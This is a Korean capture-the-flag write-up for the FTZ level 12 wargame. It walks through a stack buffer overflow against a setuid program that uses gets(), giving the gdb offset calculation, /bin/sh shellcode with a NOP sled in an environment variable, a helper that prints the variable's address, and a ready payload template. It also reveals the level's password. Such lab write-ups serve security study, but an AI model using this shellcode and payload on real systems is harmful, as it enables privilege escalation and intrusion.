# FTZ 12  
## 문제설명  
attackme 프로그램을 공격하자. attackme의 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
```
#include <stdoi.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	char str[256];

	setreuid( 3093, 3093);
	printf( "문장을 입력하세요.\n");
	gets(str);
	printf("%s\n", str);
}
```  

## 문제 풀이  
### 풀이과정  
1. ls -al을 해보자. attackme 프로그램에 level13 권한으로 setuid가 걸려있다. BOF 공격으로 attackme 파일에서 쉘을 열고 level13 권한으로 해당 레벨의 password를 알아내면 될 것 같다.  
2. hint 파일을 해석해보자.  
```
#include <stdoi.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
        char str[256];  # string 배열 256byte

        setreuid( 3093, 3093); # level13의 프로세스 ID, 이걸로 attackme의 uid가 level13이 되었다.
        printf( "문장을 입력하세요.\n");
        gets(str); # gets 함수로 사용자 입력을 str 변수에 담는다.
        printf("%s\n", str); # str 변수에 입력받은 내용 출력
}

```
3. 풀이는 다음과 같다.  
* str[256]의 시작점에서 main() ret까지의 거리를 구한다.  
* 환경변수에 쉘 코드를 등록하고 주소를 확인한다.  
* ret 위치의 데이터를 쉘 코드 주소로 변조시킬 페이로드를 작성한다.  
* 페이로드를 이용해 쉘 획득  

4. gdb를 이용해 main()과 ret 까지의 거리를 구해보자.  
그러기 위해 우선 ```cp attackme tmp/``` tmp에 attackme를 복사.   
모든 작업은 tmp에서 진행한다.  
```
gdb attackme
set disassembly-flavor intel // 우리에게 익숙한 intel 어셈블리로 바꾼다.
disas main // main을 디스어셈블한다.
```  
5. lea	eax, [ebp-264] : 이 부분을 통해 str 버퍼에서 ebp까지의 거리가 264라는 것을 알 수 있다.  
에 그렇지만 우리는 256byte의 배열을 선언했는걸?! => 나머지 8byte는 더미값!
그리고 ret 시작점은 264 + 4byte(ebp 크기) = 268byte 이다.  
즉, str[256] 시작점에서부터 main() ret까지 거리는 268byte

6. 환경변수에 등록할 쉘코드를 구글링(반드시 직접 짜보겠어...)을 통해 구하자.  
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```  

7. 쉘코드(25Byte, /bin/sh를 실행시키는 코드)를 환경변수에 등록하자.  
```
export SHELL=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
```  
> NOP Sled 기법을 이용하기 때문에 null(\90)은 충분히 많이 준다.  
> 환경변수는 OS가 필요한 정보를 메모리에 등록해놓고 필요할 때 마다 참조하는 영역을 의미한다. 일반 사용자 역시 환경 변수에 등록해서 사용이 가능하다.  
> 환경변수에 등록된 데이터는 고정적인 메모리 주소를 가지고 있게 된다. 그래서 우리가 필요한 쉘코드를 환경변수에 등록하고 이 환경 변수의 메모리 주소를 알아와서 ret에덮어씌우면, 환경변수에 등록한 쉘코드가 실행되어 변조가 가능하게 된다.  
>> export (환경변수명) = (사용자입력)  
>> 인터프리터를 실행하는 두 번째 방법: python -c command는 command에 있는 문장을 실행함. 셸의 -c 옵션에 해당. 파이썬 문장은 종종 셸에서 특별한 의미가 있는 공백이나 다른 문자들을 포함하기 때문에, command 전체를 작은따옴표로 감싸주는 것이 좋음.  

8. 환경변수에 등록된 쉘코드의 주소를 알아보기 위해 간단한 c언어 코드를 만들고 실행시키자.  
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
	char *env;

	env=getenv("SHELL");
	printf("address = %p\n",env);

	return 0;
}
```  
```
gcc -o getenv getenv.c  
./getenv
```  
컴파일 후 실행시키면 쉘코드의 주소가 나온다.  

9. 이제 페이로드를 작성해보자.  
```
(python -c 'print "\x90"*268 + "[쉘코드의 주소를 리틀엔디안으로]";cat) | ./attackme

// 리틀엔디안 예시
쉘코드 주소 = 0xbffffef6
페이로드 안의 쉘코드 주소 = \xf6\xfe\xff\xbf
```  

* 작성 예시  
```
아래의 n에는 적절한 byte 수를 계산하여 넣는다. 그로인해 ret지점에 정확히 환경변수 주소가 덮이게 해야한다.
즉 n = str~ret 거리

// strcpy
./실행파일 `python –c ‘print “A”*n+”쉘코드 주소”’`

얘는 strcpy에서 argv[1]를 copy하는거니까 실행파일 먼저 실행할때 인자로 넘겨줘야하고

// gets
(python -c 'print"\x90"*n+"쉘코드 주소"'; cat) | ./실행파일

얘는 실행파일을 실행하고 입력해줘야하기 때문!!!
쉘이 안꺼지게 세미콜론으로 또 하나의 명령을 줌
```  
> 익스플로잇: 대상의 취약점으로 대상의 시스템에 침투하는 행위. 즉, 취약점을 악용하는 방법 그 자체  
ex. bof, sql injection, 설정오류 등  
> 페이로드 : 대상의 취약점으로 대상 시스템에 익스플로잇 한 뒤, 수행하는 악의적 행위. 즉, 시스템에 실행시키고자 하는 코드  
ex. 리버스쉘(윈도우 cmd로 대상 시스템에서 공격자에게 역으로 접속을 시도하는 페이로드), 바인드쉘(대상 시스템의 응답 포트에 cmd를 바인드해 공격자가 접속할 수 있도록 유도하는 페이로드)  
> 쉘코드: 공격을 수행할 때 페이로드로 사용되는 명령 집합. 쉘코드는 보통 어셈블리어로 작성하는데, 연속된 명령을 대상 시스템에서 실행한 후 명령 쉘을 얻는다.  

10. 페이로드를 실행시키니 쉘이 성공적으로 떨어진다. 그리고 my-pass 명령어를 통해 level13의 패스워드를 얻는다.  
11. 패스워드는 "have no clue"
